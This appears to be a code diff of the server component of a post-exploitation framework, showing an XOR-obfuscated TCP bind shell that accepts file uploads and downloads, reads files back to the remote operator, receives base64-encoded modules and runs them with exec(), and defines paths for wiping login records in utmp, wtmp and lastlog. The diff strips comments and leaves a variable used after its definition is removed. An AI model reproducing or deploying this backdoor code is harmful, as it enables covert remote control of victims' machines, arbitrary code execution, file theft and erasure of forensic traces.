@@ -1,15 +1,9 @@
-#!/usr/bin/python
-# Intersect Framework
-# Server-side shell & module handler
-# XOR TCP bind
-
-
+#!/usr/bin/env python
 import os, sys, re, signal
 import socket
 import time
 from subprocess import Popen,PIPE,STDOUT,call
 from base64 import *
-import datetime
 import platform
 import urllib2
 import random, string
@@ -22,22 +16,14 @@ import operator
 import SocketServer, SimpleHTTPServer
 from math import log
 
-
 socksize = 4096                            
 activePID = []
-
-now = datetime.datetime.now()
-logtime = (str(now.month)+"-"+str(now.day)+"-"+str(now.year)+" @ "+str(now.hour)+":"+str(now.minute))
-
-## Global variables for remote shells are defined during the creation process
-## Variables for Scrub module. Do not change unless you know what you're doing. 
 UTMP_STRUCT_SIZE    = 384
 LASTLOG_STRUCT_SIZE = 292
 UTMP_FILEPATH       = "/var/run/utmp"
 WTMP_FILEPATH       = "/var/log/wtmp"
 LASTLOG_FILEPATH    = "/var/log/lastlog"
 
-    ## Get user and environment information
 distro = os.uname()[1]
 distro2 = platform.linux_distribution()[0]
 Home_Dir = os.environ['HOME']
@@ -87,7 +73,7 @@ def handler(connection):
             newfile.write(filedata)
             newfile.close()
             if os.path.isfile(filename):
-                connection.send(xor("[+] File upload complete!\n", pin))
+                connection.send(xor("[~] File upload complete!\n", pin))
             if not os.path.isfile(filename):
                 connection.send(xor("[!] File upload failed! Please try again\n", pin))
 
@@ -101,26 +87,24 @@ def handler(connection):
                 senddata = xor(filedata, pin)
                 connection.sendall(senddata)
             else:
-                connection.send(xor("[+] File not found!", pin))
+                connection.send(xor("[!] File not found!", pin))
     
         elif cmd.startswith(":exec"):
             try:
-                getname = cmd.split(" ")        # split mod name from cmd
-                modname = getname[1]            # Parse name of module we are retrieving. Will be used for logging and output purposes
+                getname = cmd.split(" ")
+                modname = getname[1]
     
-                mod_data = ""                   # Our received file data will go here 
+                mod_data = ""
                 data = connection.recv(socksize)
                 mod_data += data
-                #print("[+] Module recieved!")
-                connection.send(xor("Complete", pin))     # sends OK msg to the client
-                modexec = b64decode(mod_data)   # decode the received file
-                module_handler(modexec, modname)            # send module to module_handler where it is executed and pipes data back to client
+                connection.send(xor("Complete", pin))
+                modexec = b64decode(mod_data)
+                module_handler(modexec, modname)
 
             except IndexError:
                 pass
 
         elif cmd == (":quit"):
-            print("[!] Closing server!")
             conn.close()
             os._exit(0)
             sys.exit(0)
@@ -139,7 +123,7 @@ def accept():
         connection, address = conn.accept()
         connection.send(xor("shell => ", pin))
         reaper()
-        childPid = os.fork()                     # forks the incoming connection and sends to conn handler
+        childPid = os.fork()
         if childPid == 0:
             handler(connection)
         else:
@@ -147,8 +131,8 @@ def accept():
 
 
 def module_handler(module, modname):
-    status_msg("[+] Module: %s\n" % modname)
-    status_msg("[+] Start time: %s" % logtime)
+    status_msg("[~] Module: %s\n" % modname)
+    status_msg("[~] Start time: %s" % logtime)
     exec(module)
     connection.send(xor("shell => ", pin))
 
@@ -164,7 +148,7 @@ def log_msg(message):
 def cat_file(filename):
     if os.path.exists(filename) and os.access(filename, os.R_OK):
         catfile = open(filename, "rb")
-        connection.send(xor("[+] Contents of %s" % filename, pin))
+        connection.send(xor("[*] Contents of %s" % filename, pin))
         for lines in catfile.readlines():
             connection.sendall(xor( lines ,pin))
         catfile.close()
@@ -216,5 +200,4 @@ def users():
             uid = int(fields[2])
             if uid > 500 and uid < 32328:
                 userlist.append(fields[0])
-
 
